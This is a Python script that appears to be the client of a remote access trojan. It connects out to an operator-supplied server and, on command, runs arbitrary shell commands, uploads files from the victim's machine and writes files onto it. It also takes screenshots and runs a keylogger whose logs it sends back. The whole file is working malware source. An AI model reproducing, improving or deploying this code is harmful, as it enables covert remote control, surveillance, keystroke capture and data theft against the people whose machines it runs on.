import socket
import os
import subprocess
# import sys
# import pyautogui
# import numpy as np
# import cv2,pickle,struct,imutils
import pyscreenshot as ImageGrab
from pynput.keyboard import Listener,Key 
import platform
# import time



s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)


host=input("Enter the IP Address of the Server: ")
port=int(input("Enter the port number the server is listening: "))



s.connect((host,port)) 


count=0
def capture_keys():

    def on_press(key):
        global count
        count+=1
        with open("log.txt","a") as f:
            if(key == Key.space):
                key = str(key).replace("Key.space", " ")
            if(key == Key.backspace):
                key = str(key).replace("Key.backspace", " ")
            if(key == Key.enter):
                key = str(key).replace("Key.enter", " ")
            
            key=str(key).replace("Key.","")
            key=key.replace("'","")
            f.write(key)


    def on_release(key):
        global count 
        if key == Key.esc or count > 40:
            count=0
            return False

    with Listener(on_press=on_press,on_release=on_release) as listener:
            listener.join()




while True:
    try:
        data=s.recv(20480)
        if data[:].decode() == "exit":
            s.close()
            break


        if data[:].decode() == "sysinfo":
            my_system = platform.uname()
 
            output=f"System: {my_system.system}\n"+f"Node Name: {my_system.node}\n"+f"Release: {my_system.release}\n"+f"Version: {my_system.version}\n"+f"Machine: {my_system.machine}\n"+f"Processor: {my_system.processor}\n"
            output+= os.getcwd() + "> "
            s.send(output.encode())
            continue


        if data[:].decode("utf-8").split(" ")[0] == "getfile":
            filepath=data[:].decode("utf-8").split(" ")[1]
            filename=os.path.basename(filepath)
            s.send("sending_file".encode())
            s.recv(2048)
            try:
                f=open(filepath,"rb")
                data=f.read()
                l=len(data)
                s.send(str(l).encode())
                s.recv(1024)
                s.send(data)
                s.recv(1024)
                f.close()

            except:
                s.send("0".encode())
                s.recv(1024)

            output=os.getcwd() + "> "
            s.send(output.encode())
            continue

        if data[:].decode("utf-8").split(" ")[0] == "sendfile":
            filepath=data[:].decode("utf-8").split(" ")[1]
            s.send("receiving_file".encode())
            filename=os.path.basename(filepath)
            l=int(s.recv(20480).decode())

            if l==0:
                pass        

            else:
                f=open(filename,"wb")
                s.send("start".encode())
                curr_len=0
                while curr_len<l:
                    data=s.recv(204800)
                    curr_len+=len(data)
                    f.write(data)
                    s.send(str(curr_len).encode())

                s.recv(1024)
                f.close()

            output=os.getcwd() + "> "
            s.send(output.encode())
            continue


        if data[:].decode() == "ss":
            s.send("clicking".encode())
            im=ImageGrab.grab()
            im.save("screenshot.jpg")
            f=open("screenshot.jpg","rb")
            data=f.read()

            l=len(data)
            s.send(str(l).encode())

            response=s.recv(20480)
            s.send(data)
            fin=s.recv(1024)

            f.close()
            os.remove("screenshot.jpg")

            response=os.getcwd()+"> "
            s.send(response.encode())
            continue

        if data[:].decode() == "keylogger":
            s.send("Logging_keys".encode())
            s.recv(1024)
            capture_keys()
            s.send("done".encode())
            s.recv(1024)
            f=open("log.txt","rb")
            data=f.read()
            l=len(data)
            s.send(str(l).encode())
            s.recv(1024)
            s.send(data)
            s.recv(1024)
            f.close()
            os.remove("log.txt")
            output=os.getcwd()+"> "
            s.send(output.encode())
            continue



        if data[:2].decode("utf-8") == "cd":   
            path=data[3:].decode("utf-8")      
            os.chdir(path)


        if len(data) > 0:
            
            cmd=subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,
                                    stdin=subprocess.PIPE,stderr=subprocess.PIPE)   
                                                                      
            output_byte=cmd.stdout.read() + cmd.stderr.read()   
            output_string=str(output_byte,"utf-8") 
            current_dir=os.getcwd() + "> "       
            
            s.send(str.encode(output_string+current_dir))      
            print(output_string+current_dir)           
                 
            cmd.terminate()

    except Exception as e:
        print("Connection has been closed")
        s.close()
        break
